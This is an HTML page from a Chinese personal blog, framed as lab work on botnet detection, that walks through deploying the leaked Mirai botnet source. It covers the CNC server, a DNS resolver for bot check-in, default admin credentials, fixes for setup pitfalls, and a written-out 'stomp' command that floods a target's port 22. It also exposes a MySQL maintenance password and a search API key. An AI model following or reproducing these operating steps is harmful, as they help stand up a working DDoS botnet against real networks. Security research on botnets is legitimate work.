@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #199475; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #0B6E48, 0 0 5px     #0B6E48; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #044D22;    /*上边框颜色*/
+        border-left-color: #044D22;    /*左边框颜色*/
+    }
+</style>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/trojan_32px_573178_easyicon.net.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/trojan_16px_573178_easyicon.net.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="botnet," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在实验室的内网环境里搭建了mirai的bot，在公网IP上搭建了cnc服务器。目前可以通过Telnet登陆到cnc服务并下发命令给内网的bot，让它们对指定IP的某个端口进行ddos攻击。其实步骤也不多，但是网上很多教程说的不是特别清楚，导致中间踩了好多坑才搭好。">
+<meta name="keywords" content="botnet">
+<meta property="og:type" content="article">
+<meta property="og:title" content="开源代码mirai环境初步搭建">
+<meta property="og:url" content="http://yoursite.com/2019/04/14/mirai教程/index.html">
+<meta property="og:site_name" content="metang&#39;s blog">
+<meta property="og:description" content="在实验室的内网环境里搭建了mirai的bot，在公网IP上搭建了cnc服务器。目前可以通过Telnet登陆到cnc服务并下发命令给内网的bot，让它们对指定IP的某个端口进行ddos攻击。其实步骤也不多，但是网上很多教程说的不是特别清楚，导致中间踩了好多坑才搭好。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-04-14T09:23:51.473Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="开源代码mirai环境初步搭建">
+<meta name="twitter:description" content="在实验室的内网环境里搭建了mirai的bot，在公网IP上搭建了cnc服务器。目前可以通过Telnet登陆到cnc服务并下发命令给内网的bot，让它们对指定IP的某个端口进行ddos攻击。其实步骤也不多，但是网上很多教程说的不是特别清楚，导致中间踩了好多坑才搭好。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'TZVHEBFK02',
+      apiKey: '1ab48ccb78c0b1c98cf0e7935807338f',
+      indexName: 'my_blog',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键字进行搜索","hits_empty":"找不到关于  ${query} 的文章","hits_stats":"共找到 ${hits} 篇文章，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/14/mirai教程/"/>
+
+
+
+
+
+  <title>开源代码mirai环境初步搭建 | metang's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://github.com/metang326"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/e7bbb0521b397edbd5fe43e7f760759336b5e05f/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677265656e5f3030373230302e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_green_007200.png"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">metang's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">In case I don't see ya', good afternoon, good evening and goodnight.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/14/mirai教程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="metang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="metang's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">开源代码mirai环境初步搭建</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-14T00:00:00+08:00">
+                2019-04-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/botnet检测/" itemprop="url" rel="index">
+                    <span itemprop="name">botnet检测</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,577
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在实验室的内网环境里搭建了mirai的bot，在公网IP上搭建了cnc服务器。目前可以通过Telnet登陆到cnc服务并下发命令给内网的bot，让它们对指定IP的某个端口进行ddos攻击。其实步骤也不多，但是网上很多教程说的不是特别清楚，导致中间踩了好多坑才搭好。</p>
+<a id="more"></a>
+<h1 id="github源码"><a href="#github源码" class="headerlink" title="github源码"></a>github源码</h1><p><a href="https://github.com/jgamblin/Mirai-Source-Code/" target="_blank" rel="external">https://github.com/jgamblin/Mirai-Source-Code/</a></p>
+<h1 id="框架介绍"><a href="#框架介绍" class="headerlink" title="框架介绍"></a>框架介绍</h1><h2 id="Requirements（原作者写的）"><a href="#Requirements（原作者写的）" class="headerlink" title="Requirements（原作者写的）"></a>Requirements（原作者写的）</h2><h3 id="Bare-Minimum"><a href="#Bare-Minimum" class="headerlink" title="Bare Minimum"></a>Bare Minimum</h3><p>2 servers: 1 for CNC + mysql, 1 for scan receiver, and 1+ for loading</p>
+<h3 id="Pro-Setup-my-setup"><a href="#Pro-Setup-my-setup" class="headerlink" title="Pro Setup (my setup)"></a>Pro Setup (my setup)</h3><p>2 VPS and 4 servers</p>
+<ul>
+<li>1 VPS with extremely bulletproof host for database server</li>
+<li>1 VPS, rootkitted, for scanReceiver and distributor</li>
+<li>1 server for CNC (used like 2% CPU with 400k bots)</li>
+<li>3x 10gbps NForce servers for loading (distributor distributes to 3 servers equally)</li>
+</ul>
+<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>mirai作为一个僵尸网络，最核心的部分就是cnc控制端了，用来统计连接上的bot数量，创建用户，以及给bot发命令等行为。因此cnc就相当于是mirai的大脑，作者为了隐蔽cnc服务器所在的IP地址，让bot通过解析域名的方式获取到cnc服务器的IP，然后连接上去。但我是在实验室的内网里面做实验的，所以我的bot都是位于内网，cnc放在了公网。又因为我没有域名，所以还需要在实验室内部的某个机器上搭建一个自己的DNS解析服务器，用来提供域名解析服务，将我自己设置的某个域名作为cnc的域名，解析给所有的bot。</p>
+<p><strong>我自己在实验室内网上跑了一下mirai的代码，目前做到的是：</strong></p>
+<p>（1）bot程序可以通过自己设置的DNS解析获取到cnc的IP地址，bot可以连接到cnc；</p>
+<p>（2）内网的机器通过telnet可以连接到公网上运行的cnc端，输入用户名和密码后就可以登陆进去；</p>
+<p>（3）手动在多个内网的虚拟机上运行mirai.dbg程序，也就是多个bot，都可以连接到cnc端；在cnc端也可以看到正确的bot数量；</p>
+<p>（4）cnc端下达攻击命令后，bot都可以收到命令并执行ack攻击之类的攻击行为。</p>
+<p>还存在一些没做到的地方：</p>
+<p>（1）bot的扫描段开启之后暴力扫描机器这部分没有成功破解到的机器；</p>
+<p>（2）loader服务器的配置还不明白；</p>
+<p>（3）bot感染新bot这部分没有做到，我的bot都是自己手动开启的。</p>
+<h1 id="我的服务器架构"><a href="#我的服务器架构" class="headerlink" title="我的服务器架构"></a>我的服务器架构</h1><h2 id="cnc服务器"><a href="#cnc服务器" class="headerlink" title="cnc服务器"></a>cnc服务器</h2><p>把cnc服务器放在公网比较方便的一点是，搭建好了bot环境后，自己随便在哪个机器都可以登录到cnc端，通过用户名和密码的验证之后就可以发攻击命令给bot们了。</p>
+<p>124.193.<strong><strong>. </strong></strong></p>
+<h2 id="DNS解析服务器"><a href="#DNS解析服务器" class="headerlink" title="DNS解析服务器"></a>DNS解析服务器</h2><p>192.168.2.136</p>
+<h2 id="loader服务器-还没有部署"><a href="#loader服务器-还没有部署" class="headerlink" title="loader服务器(还没有部署)"></a>loader服务器(还没有部署)</h2><p>192.168.105.127</p>
+<h2 id="bot需要设置的"><a href="#bot需要设置的" class="headerlink" title="bot需要设置的"></a>bot需要设置的</h2><ul>
+<li>主控服务器域名：<code>www.mytang.com</code></li>
+<li>主控服务器IP：<code>124.193.****.****</code></li>
+<li>Loader服务器域名：<code>www.loader.com</code></li>
+<li>Loader服务器IP：<code>192.168.105.127</code></li>
+</ul>
+<p>在bot的源码中[resolv.c]要修改域名解析服务器为自己搭建的bind9解析服务器所在IP。</p>
+<h2 id="cnc服务器需要设置的"><a href="#cnc服务器需要设置的" class="headerlink" title="cnc服务器需要设置的"></a>cnc服务器需要设置的</h2><p>管理员用户名：mirai-user</p>
+<p>登录密码：mirai-pass</p>
+<h1 id="mirai搭建准备"><a href="#mirai搭建准备" class="headerlink" title="mirai搭建准备"></a>mirai搭建准备</h1><p>1、 源码下载地址：<a href="https://github.com/jgamblin/Mirai-Source-Code" target="_blank" rel="external">https://github.com/jgamblin/Mirai-Source-Code</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">下载命令： git clone https://github.com/jgamblin/Mirai-Source-Code</div></pre></td></tr></table></figure>
+<p>2、下载依赖的库</p>
+<p>. 安装gcc编译器：sudo apt-get install gcc  </p>
+<p>.安装编译环境：sudo apt-get install build-essential</p>
+<p>. 安装go语言： sudo apt-get install golang</p>
+<p>. 安装内存调试工具electric-fence： sudo apt-get install electric-fence</p>
+<p>. 安装数据库： sudo apt-get install mysql-server mysql-client（安装时需要设置数据库密码要记住）</p>
+<p><strong>[坑1] mysql安装时没有提示输入密码  安装好后进不了mysql</strong></p>
+<p>查看sudo vim /etc/mysql/debian.cnf  这里保存了安装时系统自己设置的用户名和密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># Automatically generated for Debian scripts. DO NOT TOUCH!</div><div class="line">[client]</div><div class="line">host     = localhost</div><div class="line">user     = debian-sys-maint</div><div class="line">password = Jhr3w56TlizV0D0w</div><div class="line">socket   = /var/run/mysqld/mysqld.sock</div><div class="line">[mysql_upgrade]</div><div class="line">host     = localhost</div><div class="line">user     = debian-sys-maint</div><div class="line">password = Jhr3w56TlizV0D0w</div><div class="line">socket   = /var/run/mysqld/mysqld.sock</div><div class="line">~</div></pre></td></tr></table></figure>
+<p>mysql -udebian-sys-maint -pJhr3w56TlizV0D0w mirai  输入之后可以登录进数据库了</p>
+<h1 id="配置DNS服务器"><a href="#配置DNS服务器" class="headerlink" title="配置DNS服务器"></a>配置DNS服务器</h1><p>由于僵尸机器是通过解析域名来得到cnc服务的地址的，所以我在台式机192.168.2.136安装了bind9，搭建局域网内的dns解析服务器。</p>
+<p>mytang@mytang-QiTianM610-D529:/etc</p>
+<p>其中db.mytang.com是为了我需要解析的域名而新加的文件 内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">; BIND data file for local loopback interface</div><div class="line">;</div><div class="line">$TTL    604800</div><div class="line">@       IN      SOA     mytang.com. root.mytang.com. (</div><div class="line">                              2         ; Serial</div><div class="line">                         604800         ; Refresh</div><div class="line">                          86400         ; Retry</div><div class="line">                        2419200         ; Expire</div><div class="line">                         604800 )       ; Negative Cache TTL</div><div class="line">;</div><div class="line">@       IN      NS      mytang.com.</div><div class="line">www     IN      A       124.193.****.****</div><div class="line">@       IN      AAAA    ::1</div><div class="line">​</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">在named.conf.default-zones结尾加上：</div></pre></td></tr></table></figure>
+<p>zone “mytang.com”{<br>        type master;<br>        file “/etc/bind/db.mytang.com”;<br>};<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">重启bind9： sudo /etc/init.d/bind9 restart</div><div class="line"></div><div class="line">只配置了域名解析到ip这部分的功能 。而且还得在/etc/resolv.conf里面增加nameserver 192.168.2.136</div><div class="line"></div><div class="line">**[坑2]重启bind9之后在本机可以通过**</div></pre></td></tr></table></figure></p>
+<p>nslookup www.mytang.com 192.168.2.136<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">查看，验证dns可以解析了。但是在192.168.105.127虚拟机上面无法解析   报的错误是超时。后来发现是防火墙配置只让53端口的input被接受了 没有accept53端口的OUTPUT 。除了tcp 还得设置udp的。(但是重启之后就又要重新设置了)                        </div><div class="line"></div><div class="line">DNS同时占用TCP和UDP的53号端口。因为查询很频繁，使用UDP报文给服务器带来的负担小，所以查询的时候使用的是UDP报文。主副DNS进行区域传送的时候，用TCP，因为要保证数据的准确性。</div></pre></td></tr></table></figure></p>
+<p>iptables -A OUTPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A OUTPUT -p udp –dport 53 -j ACCEPT<br>iptables -A INPUT -p udp –dport 53 -j ACCEPT<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">输入sudo /etc/init.d/bind9 restart 重启bind9 然后可以查询到了。</div><div class="line"></div><div class="line">**[坑3]bind9设置的域名不能带下划线之类的符号**</div><div class="line"></div><div class="line"># 配置主控端cnc</div><div class="line"></div><div class="line">基本参考https://www.jianshu.com/p/d16ee2cbe1e7 进行配置 编译cnc文件夹下面的go语言编写的代码。</div><div class="line"></div><div class="line">**[坑4]作者留了一个大坑 /Mirai-Source-Code/mirai/debug/目录下面的cnc文件是编译之后生成的可执行文件**</div><div class="line"></div><div class="line">但是必须在/Mirai-Source-Code/mirai目录下使用./debug/cnc 命令运行</div><div class="line"></div><div class="line">如果在/debug目录下执行./cnc  程序可以运行 但是当通过telnet远程连接到cnc服务器的时候连接会在连上的一瞬间就断开。</div><div class="line"></div><div class="line">**原因**</div><div class="line"></div><div class="line">​</div></pre></td></tr></table></figure></p>
+<p>ubuntu@ubuntu16:~/Mirai-Source-Code/mirai$ ls<br>bot  build.sh  cnc  debug  prompt.txt  release  tools<br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">prompt.txt这个文件在mirai目录下 但是cnc源代码中：</div><div class="line"></div><div class="line">​</div></pre></td></tr></table></figure></p>
+<p>headerb, err := ioutil.ReadFile(“prompt.txt”)<br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">因此当我们需要运行debug目录下的文件的时候，由于debug目录下没有&quot;prompt.txt&quot; ，所以会出错。</div><div class="line"></div><div class="line">**[坑5]** telnet无法启动</div><div class="line"></div><div class="line">原因：防火墙没有设置23端口</div></pre></td></tr></table></figure></p>
+<p>iptables -A INPUT -p tcp –dport 23 -j ACCEPT<br>iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT<br>iptables -L -n   查看防火墙设置/bind$ ls<br>bind.keys  db.255    db.root            named.conf.default-zones  rndc.key<br>db.0       db.empty  db.mytang.com  named.conf.local          zones.rfc1918<br>db.127     db.local  named.conf         named.conf.options<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">其中db.mytang.com是为了我需要解析的域名而新加的文件 内容为：</div></pre></td></tr></table></figure></p>
+<p>;<br>; BIND data file for local loopback interface<br>;<br>$TTL    604800<br>@       IN      SOA     mytang.com. root.mytang.com. (<br>​                              2         ; Serial<br>​                         604800         ; Refresh<br>​                          86400         ; Retry<br>​                        2419200         ; Expire<br>​                         604800 )       ; Negative Cache TTL<br>;<br>@       IN      NS      mytang.com.<br>www     IN      A       124.193.<strong><strong>.</strong></strong><br>@       IN      AAAA    ::1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">在named.conf.default-zones结尾加上：</div></pre></td></tr></table></figure></p>
+<p>zone “mytang.com”{<br>​        type master;<br>​        file “/etc/bind/db.mytang.com”;<br>};<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">只配置了域名解析到ip这部分的功能 。而且还得在/etc/resolv.conf里面增加nameserver 192.168.2.136</div><div class="line"></div><div class="line">**[坑6]重启bind9之后在本机可以通过**</div></pre></td></tr></table></figure></p>
+<p>nslookup www.mytang.com 192.168.2.136<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">查看，验证dns可以解析了。但是在192.168.105.127虚拟机上面无法解析   报的错误是超时。后来发现是防火墙配置只让53端口的input被接受了 没有accept53端口的OUTPUT 。除了tcp 还得设置udp的。(但是重启之后就又要重新设置了)                        DNS同时占用TCP和UDP的53号端口。因为查询很频繁，使用UDP报文给服务器带来的负担小，所以查询的时候使用的是UDP报文。</div><div class="line">主副DNS进行区域传送的时候，用TCP，因为要保证数据的准确性。</div></pre></td></tr></table></figure></p>
+<p>iptables -A OUTPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A OUTPUT -p udp –dport 53 -j ACCEPT<br>iptables -A INPUT -p udp –dport 53 -j ACCEPT<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">输入sudo /etc/init.d/bind9 restart 重启bind9 然后可以查询到了。</div><div class="line"></div><div class="line"># mirai运行流程</div><div class="line"></div><div class="line">首先在124.193.****.****开启cnc服务程序；</div><div class="line">然后通过telnet 124.193.****.****来登录到cnc主控；</div><div class="line">然后开启DNS服务器192.168.2.136的23端口；</div><div class="line">然后在bot机器上运行mirai.dbg程序，在cnc端显示bot数量；</div><div class="line">cnc下达命令给bot 开始攻击。</div><div class="line"></div><div class="line">一些常用的运行指令在下面整理了一下，方便查阅。</div><div class="line"></div><div class="line"># 常用指令</div><div class="line"></div><div class="line">## 后台运行mirai的cnc程序</div><div class="line"></div><div class="line">sudo nohup ./debug/cnc</div><div class="line"></div><div class="line">## 检查端口对应的进程</div><div class="line"></div><div class="line">sudo netstat -napt|grep 23</div><div class="line"></div><div class="line">## 查看端口的流量</div><div class="line"></div><div class="line">sudo tcpdump not src host 192.168.2.136  and dst port 22</div><div class="line"></div><div class="line">## cnc服务器所在的机器打开Telnet的23端口</div><div class="line"></div><div class="line">sudo iptables -A INPUT -p tcp --dport 23 -j ACCEPT    </div><div class="line">sudo iptables -A OUTPUT -p tcp --dport 23 -j ACCEPT</div><div class="line">sudo iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT        </div><div class="line">sudo iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT        </div><div class="line"></div><div class="line">## dns解析服务器重启之后开启53端口</div><div class="line"></div><div class="line">iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT    </div><div class="line">iptables -A INPUT -p tcp --dport 53 -j ACCEPT   </div><div class="line">iptables -A OUTPUT -p udp --dport 53 -j ACCEPT   </div><div class="line">iptables -A INPUT -p udp --dport 53 -j ACCEPT</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># 攻击尝试</div><div class="line"></div><div class="line">## syn攻击</div><div class="line">对应的函数为attack_tcp.c中的attack_tcp_syn函数</div><div class="line"></div><div class="line">## ack攻击</div><div class="line">对应的函数为attack_tcp.c中的attack_tcp_ack</div><div class="line"></div><div class="line">## stomp攻击</div><div class="line">对应的函数为attack_tcp.c中的</div><div class="line"></div><div class="line">一开始攻击失败的原因：把持续时间那个参数当成了时间间隔，设置的太小了；攻击的端口没有开放，后来就改成了指定22端口；debug版本里面while循环有一个break，只攻击一次就跳出来了。</div><div class="line"></div><div class="line">```stomp 192.168.105.141 120 dport=22</div><div class="line">stomp 192.168.105.141 120 dport=22</div></pre></td></tr></table></figure></p>
+<p>攻击成功之后可以在对应机器上查看端口流量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo tcpdump not src host 192.168.2.136  and dst port 22</div></pre></td></tr></table></figure>
+<p>这里过滤掉的是我台式机ssh连接产生的流量。</p>
+
+      
+    </div>
+    
+    
+    
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="metang 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/aipay.jpg" alt="metang 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/botnet/" rel="tag"><i class="fa fa-tag"></i> botnet</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/20/[爬虫]从在线阅读网站下载小说/" rel="next" title="从在线阅读网站下载小说">
+                <i class="fa fa-chevron-left"></i> 从在线阅读网站下载小说
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/14/[爬虫]使用virustotal的api进行URL扫描/" rel="prev" title="使用virustotal的api进行URL扫描">
+                使用virustotal的api进行URL扫描 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
